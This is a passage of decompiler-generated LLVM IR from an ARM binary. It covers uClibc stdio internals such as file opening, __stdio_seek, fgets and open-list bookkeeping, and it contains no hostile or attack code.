  %v0_18a80 = phi i32 [ %v2_18a78, %bb34 ], [ %v0_18a80.pre, %dec_label_pc_18a74 ]
  %v0_18a7c = load i32, i32* @r6, align 4
  store i32 %v0_18a7c, i32* %r0.global-to-local, align 4
  store i32 %v0_18a80, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_18a88 = inttoptr i32 %v0_18a7c to i8*
  %v3_18a88 = call i32 @__libc_open(i8* %v2_18a88, i32 %v0_18a80)
  store i32 %v3_18a88, i32* %r0.global-to-local, align 4
  %v1_18a8c = icmp slt i32 %v3_18a88, 0
  %v2_18a8c = icmp eq i32 %v3_18a88, 0
  store i1 %v2_18a8c, i1* %cpsr_z.global-to-local, align 1
  %v1_18a90 = load i32, i32* @r8, align 4
  %v2_18a90 = add i32 %v1_18a90, 4
  %v3_18a90 = inttoptr i32 %v2_18a90 to i32*
  store i32 %v3_18a88, i32* %v3_18a90, align 4
  br i1 %v1_18a8c, label %dec_label_pc_189ac, label %dec_label_pc_18a98

dec_label_pc_18a98:                               ; preds = %dec_label_pc_18a74._crit_edge, %dec_label_pc_18a68
  %v0_18a98 = load i32, i32* @r8, align 4
  %v1_18a98 = inttoptr i32 %v0_18a98 to i32*
  %v2_18a98 = load i32, i32* %v1_18a98, align 4
  %v1_18a9c = and i32 %v2_18a98, 8192
  store i32 %v1_18a9c, i32* %r3.global-to-local, align 4
  %v3_18aa01 = udiv i32 %v1_18a9c, 256
  store i32 %v3_18aa01, i32* %r2.global-to-local, align 4
  %v1_18aa4 = trunc i32 %v3_18aa01 to i8
  %v3_18aa4 = add i32 %v0_18a98, 1
  %v4_18aa4 = inttoptr i32 %v3_18aa4 to i8*
  store i8 %v1_18aa4, i8* %v4_18aa4, align 1
  %v0_18aa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18aa8 = trunc i32 %v0_18aa8 to i8
  %v2_18aa8 = load i32, i32* @r8, align 4
  %v3_18aa8 = inttoptr i32 %v2_18aa8 to i8*
  store i8 %v1_18aa8, i8* %v3_18aa8, align 1
  %v0_18aac = load i32, i32* @r4, align 4
  %v1_18aac = and i32 %v0_18aac, ptrtoint ([7 x i8]* @global_var_20000.1340 to i32)
  store i32 %v1_18aac, i32* %r1.global-to-local, align 4
  %v2_18aac = icmp eq i32 %v1_18aac, 0
  store i1 %v2_18aac, i1* %cpsr_z.global-to-local, align 1
  %v0_18ab0 = load i32, i32* @r8, align 4
  %v1_18ab0 = add i32 %v0_18ab0, 1
  %v2_18ab0 = inttoptr i32 %v1_18ab0 to i8*
  %v3_18ab0 = load i8, i8* %v2_18ab0, align 1
  %v4_18ab0 = zext i8 %v3_18ab0 to i32
  %v1_18ab4 = inttoptr i32 %v0_18ab0 to i8*
  %v2_18ab4 = load i8, i8* %v1_18ab4, align 1
  %v3_18ab4 = zext i8 %v2_18ab4 to i32
  store i32 %v3_18ab4, i32* %r3.global-to-local, align 4
  br i1 %v2_18aac, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_18a98
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_18a98, %bb35
  %v0_18ac8 = phi i32 [ 0, %dec_label_pc_18a98 ], [ 32768, %bb35 ]
  %v1_18abc = and i32 %v0_18aac, 1024
  store i32 %v1_18abc, i32* %r0.global-to-local, align 4
  %v4_18ac4 = mul nuw nsw i32 %v4_18ab0, 256
  %v5_18ac4 = or i32 %v3_18ab4, %v4_18ac4
  %v2_18ac8 = or i32 %v0_18ac8, %v1_18abc
  store i32 %v2_18ac8, i32* %r1.global-to-local, align 4
  %v2_18ad0 = or i32 %v5_18ac4, %v2_18ac8
  %v1_18ac0 = mul i32 %v0_18aac, 16
  %v1_18acc = and i32 %v1_18ac0, 48
  %v1_18ad4 = add nuw nsw i32 %v1_18acc, 16
  %v4_18ad8 = xor i32 %v1_18ad4, 48
  %v5_18ad8 = or i32 %v2_18ad0, %v4_18ad8
  store i32 %v5_18ad8, i32* %r3.global-to-local, align 4
  %v3_18adc19 = udiv i32 %v2_18ad0, 256
  store i32 %v3_18adc19, i32* %r2.global-to-local, align 4
  %v1_18ae0 = trunc i32 %v3_18adc19 to i8
  store i8 %v1_18ae0, i8* %v2_18ab0, align 1
  %v0_18ae4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ae4 = trunc i32 %v0_18ae4 to i8
  %v2_18ae4 = load i32, i32* @r8, align 4
  %v3_18ae4 = inttoptr i32 %v2_18ae4 to i8*
  store i8 %v1_18ae4, i8* %v3_18ae4, align 1
  %v0_18ae8 = call i32 @__errno_location()
  store i32 %v0_18ae8, i32* %r0.global-to-local, align 4
  %v0_18aec = load i32, i32* @r8, align 4
  %v1_18aec = add i32 %v0_18aec, 1
  %v2_18aec = inttoptr i32 %v1_18aec to i8*
  %v3_18aec = load i8, i8* %v2_18aec, align 1
  %v4_18aec = zext i8 %v3_18aec to i32
  store i32 %v4_18aec, i32* %r3.global-to-local, align 4
  %v1_18af0 = inttoptr i32 %v0_18aec to i8*
  %v2_18af0 = load i8, i8* %v1_18af0, align 1
  %v3_18af0 = zext i8 %v2_18af0 to i32
  store i32 %v0_18ae8, i32* @r6, align 4
  %v1_18af8 = add i32 %v0_18aec, 4
  %v2_18af8 = inttoptr i32 %v1_18af8 to i32*
  %v3_18af8 = load i32, i32* %v2_18af8, align 4
  store i32 %v3_18af8, i32* @r0, align 4
  %v4_18afc = mul nuw nsw i32 %v4_18aec, 256
  %v5_18afc = or i32 %v3_18af0, %v4_18afc
  store i32 %v5_18afc, i32* @r4, align 4
  %v1_18b00 = inttoptr i32 %v0_18ae8 to i32*
  %v2_18b00 = load i32, i32* %v1_18b00, align 4
  store i32 %v2_18b00, i32* @r5, align 4
  %v1_18b04 = call i32 @isatty(i32 %v3_18af8)
  store i32 %v1_18b04, i32* %r0.global-to-local, align 4
  %v0_18b08 = load i32, i32* @r4, align 4
  %v4_18b08 = mul i32 %v1_18b04, 256
  %v5_18b08 = or i32 %v0_18b08, %v4_18b08
  store i32 %v5_18b08, i32* @r4, align 4
  %v3_18b0c = sdiv i32 %v5_18b08, 256
  store i32 %v3_18b0c, i32* %r3.global-to-local, align 4
  %v1_18b10 = trunc i32 %v3_18b0c to i8
  %v2_18b10 = load i32, i32* @r8, align 4
  %v3_18b10 = add i32 %v2_18b10, 1
  %v4_18b10 = inttoptr i32 %v3_18b10 to i8*
  store i8 %v1_18b10, i8* %v4_18b10, align 1
  %v0_18b14 = load i32, i32* @r4, align 4
  %v1_18b14 = trunc i32 %v0_18b14 to i8
  %v2_18b14 = load i32, i32* @r8, align 4
  %v3_18b14 = inttoptr i32 %v2_18b14 to i8*
  store i8 %v1_18b14, i8* %v3_18b14, align 1
  %v0_18b18 = load i32, i32* @r5, align 4
  %v1_18b18 = load i32, i32* @r6, align 4
  %v2_18b18 = inttoptr i32 %v1_18b18 to i32*
  store i32 %v0_18b18, i32* %v2_18b18, align 4
  %v0_18b1c = load i32, i32* @r8, align 4
  %v1_18b1c = add i32 %v0_18b1c, 8
  %v2_18b1c = inttoptr i32 %v1_18b1c to i32*
  %v3_18b1c = load i32, i32* %v2_18b1c, align 4
  store i32 %v3_18b1c, i32* %r3.global-to-local, align 4
  %v2_18b20 = icmp eq i32 %v3_18b1c, 0
  store i1 %v2_18b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b20, label %dec_label_pc_18b28, label %bb37

dec_label_pc_18b28:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_18b2c = call i32 @malloc(i32 4096)
  store i32 %v1_18b2c, i32* %r0.global-to-local, align 4
  %v2_18b30 = icmp eq i32 %v1_18b2c, 0
  store i1 %v2_18b30, i1* %cpsr_z.global-to-local, align 1
  %v1_18b44.pre = load i32, i32* @r8, align 4
  br i1 %v2_18b30, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_18b28
  %v2_18b4420 = add i32 %v1_18b44.pre, 8
  %v3_18b4421 = inttoptr i32 %v2_18b4420 to i32*
  store i32 0, i32* %v3_18b4421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_18b28
  %v2_18b34 = inttoptr i32 %v1_18b44.pre to i32*
  %v3_18b34 = load i32, i32* %v2_18b34, align 4
  %v2_18b38 = or i32 %v3_18b34, 16384
  store i32 %v2_18b38, i32* %r3.global-to-local, align 4
  %v2_18b3c = add i32 %v1_18b2c, 4096
  store i32 %v2_18b3c, i32* %r2.global-to-local, align 4
  %v4_18b40 = sdiv i32 %v2_18b38, 256
  store i32 %v4_18b40, i32* %r1.global-to-local, align 4
  %v2_18b44 = add i32 %v1_18b44.pre, 8
  %v3_18b44 = inttoptr i32 %v2_18b44 to i32*
  store i32 %v1_18b2c, i32* %v3_18b44, align 4
  %v1_18b48 = load i32, i32* %r2.global-to-local, align 4
  %v2_18b48 = load i32, i32* @r8, align 4
  %v3_18b48 = add i32 %v2_18b48, 12
  %v4_18b48 = inttoptr i32 %v3_18b48 to i32*
  store i32 %v1_18b48, i32* %v4_18b48, align 4
  %v1_18b4c = load i32, i32* %r1.global-to-local, align 4
  %v2_18b4c = trunc i32 %v1_18b4c to i8
  %v3_18b4c = load i32, i32* @r8, align 4
  %v4_18b4c = add i32 %v3_18b4c, 1
  %v5_18b4c = inttoptr i32 %v4_18b4c to i8*
  store i8 %v2_18b4c, i8* %v5_18b4c, align 1
  %v0_18b50.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b50.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_18b50 = load i32, i32* %r3.global-to-local, align 4
  %v2_18b50 = trunc i32 %v1_18b50 to i8
  %v3_18b50 = load i32, i32* @r8, align 4
  %v4_18b50 = inttoptr i32 %v3_18b50 to i8*
  store i8 %v2_18b50, i8* %v4_18b50, align 1
  %v0_18b54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b54.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_18b54 = load i32, i32* @r8, align 4
  %v3_18b54 = add i32 %v2_18b54, 12
  %v4_18b54 = inttoptr i32 %v3_18b54 to i32*
  store i32 %v1_18b2c, i32* %v4_18b54, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_295e8.1343 to i32), i32* %r3.global-to-local, align 4
  %v2_18b60 = load i32, i32* @r8, align 4
  %v3_18b60 = add i32 %v2_18b60, 2
  %v4_18b60 = inttoptr i32 %v3_18b60 to i8*
  store i8 0, i8* %v4_18b60, align 1
  %v0_18b64 = load i32, i32* @r8, align 4
  %v1_18b64 = add i32 %v0_18b64, 1
  %v2_18b64 = inttoptr i32 %v1_18b64 to i8*
  %v3_18b64 = load i8, i8* %v2_18b64, align 1
  %v4_18b64 = zext i8 %v3_18b64 to i32
  store i32 %v4_18b64, i32* %r2.global-to-local, align 4
  %v2_18b68 = load i32, i32* @global_var_295e8.1343, align 4
  store i32 %v2_18b68, i32* %r1.global-to-local, align 4
  %v1_18b6c = add i32 %v0_18b64, 8
  %v2_18b6c = inttoptr i32 %v1_18b6c to i32*
  %v3_18b6c = load i32, i32* %v2_18b6c, align 4
  store i32 %v3_18b6c, i32* %r3.global-to-local, align 4
  %v1_18b70 = and i32 %v4_18b64, 32
  %v2_18b70 = icmp eq i32 %v1_18b70, 0
  store i1 %v2_18b70, i1* %cpsr_z.global-to-local, align 1
  %v2_18b74 = add i32 %v0_18b64, 20
  %v3_18b74 = inttoptr i32 %v2_18b74 to i32*
  store i32 %v3_18b6c, i32* %v3_18b74, align 4
  %v0_18b78 = load i32, i32* %r0.global-to-local, align 4
  %v1_18b78 = load i32, i32* @r8, align 4
  %v2_18b78 = add i32 %v1_18b78, 44
  %v3_18b78 = inttoptr i32 %v2_18b78 to i32*
  store i32 %v0_18b78, i32* %v3_18b78, align 4
  %v0_18b7c = load i32, i32* %r1.global-to-local, align 4
  %v1_18b7c = load i32, i32* @r8, align 4
  %v2_18b7c = add i32 %v1_18b7c, 52
  %v3_18b7c = inttoptr i32 %v2_18b7c to i32*
  store i32 %v0_18b7c, i32* %v3_18b7c, align 4
  %v0_18b80 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b80 = load i32, i32* @r8, align 4
  %v2_18b80 = add i32 %v1_18b80, 24
  %v3_18b80 = inttoptr i32 %v2_18b80 to i32*
  store i32 %v0_18b80, i32* %v3_18b80, align 4
  %v0_18b84 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b84 = load i32, i32* @r8, align 4
  %v2_18b84 = add i32 %v1_18b84, 28
  %v3_18b84 = inttoptr i32 %v2_18b84 to i32*
  store i32 %v0_18b84, i32* %v3_18b84, align 4
  %v0_18b88 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b88 = load i32, i32* @r8, align 4
  %v2_18b88 = add i32 %v1_18b88, 16
  %v3_18b88 = inttoptr i32 %v2_18b88 to i32*
  store i32 %v0_18b88, i32* %v3_18b88, align 4
  br i1 %v2_18b70, label %dec_label_pc_18c1c, label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %bb37
  %v2_18b90 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_18b90, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_295d0.1035 to i32), i32* %r2.global-to-local, align 4
  %v1_18ba8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_295d0.1035 to i32), i32* %r0.global-to-local, align 4
  %v1_18bb8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_295b8.1033 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_1896c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r1.global-to-local, align 4
  %v1_18bcc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_295b8.1033 to i32), i32* %r0.global-to-local, align 4
  %v1_18bd8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_295b4.1037 to i32), i32* %r2.global-to-local, align 4
  %v2_18be0 = load i32, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  store i32 %v2_18be0, i32* %r3.global-to-local, align 4
  store i32 %v2_1896c, i32* @r0, align 4
  %v1_18be8 = load i32, i32* @r8, align 4
  %v2_18be8 = add i32 %v1_18be8, 32
  %v3_18be8 = inttoptr i32 %v2_18be8 to i32*
  store i32 %v2_18be0, i32* %v3_18be8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_18bf4 = load i32, i32* @r8, align 4
  %v1_18bf4 = load i32, i32* %r2.global-to-local, align 4
  %v2_18bf4 = inttoptr i32 %v1_18bf4 to i32*
  store i32 %v0_18bf4, i32* %v2_18bf4, align 4
  %v1_18bfc = call i32 @__pthread_return_void()
  store i32 %v2_18b90, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 101396, i32* @lr, align 4
  %v1_18c10 = call i32 @__pthread_return_void()
  store i32 %v1_18c10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c1c

dec_label_pc_18c18:                               ; preds = %dec_label_pc_189ac, %dec_label_pc_18998, %dec_label_pc_189b8
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_18c1c

dec_label_pc_18c1c:                               ; preds = %bb37, %dec_label_pc_189f0, %dec_label_pc_18b90, %dec_label_pc_18c18
  %v0_18c1c = load i32, i32* @r8, align 4
  store i32 %v0_18c1c, i32* %r0.global-to-local, align 4
  %v2_18c24 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18c24, i32* @r4, align 4
  store i32 %v6_18960, i32* @r5, align 4
  store i32 %v9_18960, i32* @r6, align 4
  store i32 %v15_18960, i32* @r8, align 4
  ret i32 %v0_18c1c

; uselistorder directives
  uselistorder i32 %v1_18b44.pre, { 1, 0, 2 }
  uselistorder i32 %v1_18b2c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_18b0c, { 1, 0 }
  uselistorder i32 %v3_18aa01, { 1, 0 }
  uselistorder i32 %v0_18a80, { 1, 0 }
  uselistorder i1 %v7_18a74, { 1, 0 }
  uselistorder i32 %v1_18a44, { 1, 0 }
  uselistorder i32 %v0_18a44, { 1, 0 }
  uselistorder i32 %v1_18a2c, { 1, 0, 2 }
  uselistorder i32 %v1_189e0, { 1, 0 }
  uselistorder i32 %v0_189ac, { 1, 0, 2 }
  uselistorder i1 %v7_1898c, { 1, 0 }
  uselistorder i1 %v7_18980, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 19, 18, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 16, 5, 10, 4, 11, 2, 12, 3, 13, 0, 14, 1, 15, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 5, 0, 1, 4, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ()* @__stdio_init_mutex, { 0, 3, 2, 1, 4 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14, 17, 16, 15, 13 }
  uselistorder i32 22, { 0, 14, 2, 11, 3, 9, 4, 5, 6, 15, 12, 7, 13, 8, 1, 10 }
  uselistorder label %dec_label_pc_18c1c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_18c18, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_18a74._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_18a1c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_189c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18998, { 1, 2, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18c28:
  %v0_18c28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18c28, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18c28
  %v5_18c28 = sdiv i32 %arg2, 16
  %v6_18c28 = and i32 %v5_18c28, %arg1
  %v5_18c2c = sdiv i32 %arg2, 256
  %v6_18c2c = and i32 %v6_18c28, %v5_18c2c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18c28, %bb
  %v7_18c2c = phi i32 [ %arg1, %dec_label_pc_18c28 ], [ %v6_18c2c, %bb ]
  ret i32 %v7_18c2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_18c5c = load i32, i32* @r4, align 4
  %v6_18c5c = load i32, i32* @lr, align 4
  %v1_18c60 = add i32 %arg1, 4
  %v2_18c60 = inttoptr i32 %v1_18c60 to i32*
  %v3_18c60 = load i32, i32* %v2_18c60, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_18c68 = load i32, i32* %arg2, align 4
  %v3_18c68 = add i32 %tmp, 4
  %v4_18c68 = inttoptr i32 %v3_18c68 to i32*
  %v5_18c68 = load i32, i32* %v4_18c68, align 4
  %v6_18c6c = call i32 @__libc_lseek64(i32 %v3_18c60, i32 %v2_18c68, i32 %v5_18c68, i32 %arg3, i32 %v3_18c5c, i32 %v6_18c5c)
  %v1_18c70 = icmp slt i32 %v2_18c68, 0
  %v6_18c6c. = select i1 %v1_18c70, i32 %v6_18c6c, i32 0
  store i32 %v6_18c6c., i32* %r3.global-to-local, align 4
  br i1 %v1_18c70, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_18c7c = load i32, i32* @r4, align 4
  %v4_18c7c = inttoptr i32 %v3_18c7c to i32*
  store i32 %v6_18c6c, i32* %v4_18c7c, align 4
  %v6_18c7c = add i32 %v3_18c7c, 4
  %v7_18c7c = inttoptr i32 %v6_18c7c to i32*
  store i32 %v2_18c68, i32* %v7_18c7c, align 4
  %v0_18c80.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_18c80 = phi i32 [ %v6_18c6c, %entry ], [ %v0_18c80.pre, %bb ]
  ret i32 %v0_18c80

; uselistorder directives
  uselistorder i32 %v6_18c6c, { 0, 2, 1 }
  uselistorder i32 %v2_18c68, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18c88 = load i32, i32* @r4, align 4
  store i32 %v3_18c88, i32* %stack_var_-24, align 4
  %v6_18c88 = load i32, i32* @r5, align 4
  %v9_18c88 = load i32, i32* @r6, align 4
  %v12_18c88 = load i32, i32* @r7, align 4
  %v1_18c8c = add i32 %arg3, 52
  %v2_18c8c = inttoptr i32 %v1_18c8c to i32*
  %v3_18c8c = load i32, i32* %v2_18c8c, align 4
  store i32 %v3_18c8c, i32* %r8.global-to-local, align 4
  %v2_18c90 = ptrtoint i32* %stack_var_-40 to i32
  %v1_18c94 = add i32 %arg3, 56
  store i32 %v1_18c94, i32* @r5, align 4
  %v2_18c98 = icmp eq i32 %v3_18c8c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_18c90, i32* @r0, align 4
  br i1 %v2_18c98, label %dec_label_pc_18cb8, label %dec_label_pc_18cd4

dec_label_pc_18cb8:                               ; preds = %entry
  %v1_18cc0 = call i32 @__pthread_return_void()
  store i32 101588, i32* @lr, align 4
  %v1_18cd0 = call i32 @__pthread_return_0()
  %v0_18cd4.pre = load i32, i32* @r6, align 4
  %v0_18cd8.pre = load i32, i32* @r4, align 4
  %v0_18cdc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18cd4

dec_label_pc_18cd4:                               ; preds = %entry, %dec_label_pc_18cb8
  %v0_18cdc = phi i32 [ %arg1, %entry ], [ %v0_18cdc.pre, %dec_label_pc_18cb8 ]
  %v0_18cd8 = phi i32 [ %arg3, %entry ], [ %v0_18cd8.pre, %dec_label_pc_18cb8 ]
  %v0_18cd4 = phi i32 [ %arg2, %entry ], [ %v0_18cd4.pre, %dec_label_pc_18cb8 ]
  %v3_18ce0 = inttoptr i32 %v0_18cdc to i8*
  %v4_18ce0 = call i32 @__GI_fgets_unlocked(i8* %v3_18ce0, i32 %v0_18cd4, i32 %v0_18cd8)
  %v0_18ce4 = load i32, i32* %r8.global-to-local, align 4
  %v2_18ce4 = icmp eq i32 %v0_18ce4, 0
  store i32 %v4_18ce0, i32* %r4.global-to-local, align 4
  br i1 %v2_18ce4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18cd4
  store i32 101632, i32* @lr, align 4
  call void @__pseudo_branch(i32 89400)
  %v0_18d00.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18cd4, %bb
  %v0_18d00 = phi i32 [ %v4_18ce0, %dec_label_pc_18cd4 ], [ %v0_18d00.pre, %bb ]
  %v2_18d08 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18d08, i32* @r4, align 4
  store i32 %v6_18c88, i32* @r5, align 4
  store i32 %v9_18c88, i32* @r6, align 4
  store i32 %v12_18c88, i32* @r7, align 4
  ret i32 %v0_18d00

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_18cd4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_18d20 = ptrtoint i32* %stack_var_-48 to i32
  %v2_18d24 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_18d24, i32* @r0, align 4
  store i32 89400, i32* %r4.global-to-local, align 4
  %v1_18d38 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r5.global-to-local, align 4
  %v1_18d48 = call i32 @__pthread_return_0()
  %v2_18d50 = load i32, i32* @global_var_2d92c.1327, align 4
  %v7_18d54 = icmp eq i32 %v2_18d50, 1
  br i1 %v7_18d54, label %dec_label_pc_18d5c, label %dec_label_pc_18e08

dec_label_pc_18d5c:                               ; preds = %entry
  %v2_18d60 = load i32, i32* @global_var_2d930.1331, align 4
  %tmp19 = icmp slt i32 %v2_18d60, 1
  br i1 %tmp19, label %dec_label_pc_18e08, label %dec_label_pc_18d6c

dec_label_pc_18d6c:                               ; preds = %dec_label_pc_18d5c
  store i32 %v2_18d20, i32* @r0, align 4
  %v1_18d7c = call i32 @__pthread_return_void()
  %v1_18d88 = call i32 @__pthread_return_0()
  %v2_18d90 = load i32, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  store i32 %v2_18d90, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_18de03 = icmp eq i32 %v2_18d90, 0
  br i1 %v2_18de03, label %dec_label_pc_18dec, label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %dec_label_pc_18d6c, %dec_label_pc_18ddc
  %v1_18db4 = phi i32 [ %v0_18ddc, %dec_label_pc_18ddc ], [ %v2_18d90, %dec_label_pc_18d6c ]
  %v1_18d9c = inttoptr i32 %v1_18db4 to i8*
  %v2_18d9c = load i8, i8* %v1_18d9c, align 1
  %v3_18d9c = zext i8 %v2_18d9c to i32
  %v1_18da0 = add i32 %v1_18db4, 1
  %v2_18da0 = inttoptr i32 %v1_18da0 to i8*
  %v3_18da0 = load i8, i8* %v2_18da0, align 1
  %v4_18da0 = zext i8 %v3_18da0 to i32
  %v4_18da4 = mul nuw nsw i32 %v4_18da0, 256
  %v5_18da4 = or i32 %v4_18da4, %v3_18d9c
  %v2_18da8 = and i32 %v5_18da4, 32816
  %v7_18dac = icmp eq i32 %v2_18da8, 48
  %v1_18db0 = add i32 %v1_18db4, 32
  %v2_18db0 = inttoptr i32 %v1_18db0 to i32*
  %v3_18db0 = load i32, i32* %v2_18db0, align 4
  store i32 %v3_18db0, i32* %r5.global-to-local, align 4
  br i1 %v7_18dac, label %dec_label_pc_18dbc, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_18d9c
  store i32 %v1_18db4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18d9c
  %v0_18dbc = load i32, i32* %r6.global-to-local, align 4
  %v2_18dbc = icmp eq i32 %v0_18dbc, 0
  br i1 %v2_18dbc, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_18dbc
  %v3_18dc4 = add i32 %v0_18dbc, 32
  %v4_18dc4 = inttoptr i32 %v3_18dc4 to i32*
  store i32 %v3_18db0, i32* %v4_18dc4, align 4
  %v0_18dcc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_18dbc
  store i32 %v3_18db0, i32* bitcast (i32** @global_var_295b4.1037 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_18dcc = phi i32 [ %v0_18dcc.pre, %.thread ], [ %v1_18db4, %.thread1 ]
  %v1_18dcc = add i32 %v0_18dcc, 1
  %v2_18dcc = inttoptr i32 %v1_18dcc to i8*
  %v3_18dcc = load i8, i8* %v2_18dcc, align 1
  %v1_18dd0 = and i8 %v3_18dcc, 32
  %v1_18dd8 = icmp ne i8 %v1_18dd0, 0
  call void @__pseudo_cond_branch(i1 %v1_18dd8, i32 ptrtoint (i32* @global_var_14e1c.1293 to i32))
  %v0_18ddc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18ddc:                               ; preds = %.thread12, %bb
  %v0_18ddc = phi i32 [ %v0_18ddc.pre, %bb ], [ %v3_18db0, %.thread12 ]
  store i32 %v0_18ddc, i32* %r4.global-to-local, align 4
  %v2_18de0 = icmp eq i32 %v0_18ddc, 0
  br i1 %v2_18de0, label %dec_label_pc_18dec, label %dec_label_pc_18d9c

